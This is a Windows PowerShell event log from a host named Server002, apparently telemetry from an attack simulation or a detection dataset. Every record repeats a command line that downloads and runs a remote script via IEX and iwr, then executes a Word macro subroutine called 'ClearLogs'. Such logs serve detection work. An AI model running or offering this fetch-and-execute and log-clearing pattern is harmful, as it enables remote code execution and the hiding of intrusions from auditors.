{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-23 14:12:47.9264319"},"EventRecordID":"1067","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=f2091e6c-7ea6-457c-b84e-882a2070e49b\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (iwr \"https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1\" -UseBasicParsing)\r\nInvoke-script -macroFile \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.001\\src\\data.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-23 14:12:47.9601766"},"EventRecordID":"1068","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=f2091e6c-7ea6-457c-b84e-882a2070e49b\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (iwr \"https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1\" -UseBasicParsing)\r\nInvoke-script -macroFile \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.001\\src\\data.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-23 14:12:47.9601766"},"EventRecordID":"1069","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=f2091e6c-7ea6-457c-b84e-882a2070e49b\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (iwr \"https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1\" -UseBasicParsing)\r\nInvoke-script -macroFile \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.001\\src\\data.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-23 14:12:47.9601766"},"EventRecordID":"1070","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=f2091e6c-7ea6-457c-b84e-882a2070e49b\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (iwr \"https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1\" -UseBasicParsing)\r\nInvoke-script -macroFile \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.001\\src\\data.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-23 14:12:47.9601766"},"EventRecordID":"1071","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=f2091e6c-7ea6-457c-b84e-882a2070e49b\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (iwr \"https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1\" -UseBasicParsing)\r\nInvoke-script -macroFile \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.001\\src\\data.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-23 14:12:47.9601766"},"EventRecordID":"1072","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=f2091e6c-7ea6-457c-b84e-882a2070e49b\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (iwr \"https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1\" -UseBasicParsing)\r\nInvoke-script -macroFile \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.001\\src\\data.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-23 14:12:48.1326706"},"EventRecordID":"1073","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=f2091e6c-7ea6-457c-b84e-882a2070e49b\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (iwr \"https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1\" -UseBasicParsing)\r\nInvoke-script -macroFile \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.001\\src\\data.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=d771b65c-c567-447f-8fe6-9006355b2a53\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-23 14:12:50.6592242"},"EventRecordID":"1074","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=16\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=f2091e6c-7ea6-457c-b84e-882a2070e49b\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (iwr \"https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1\" -UseBasicParsing)\r\nInvoke-script -macroFile \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.001\\src\\data.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=d771b65c-c567-447f-8fe6-9006355b2a53\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
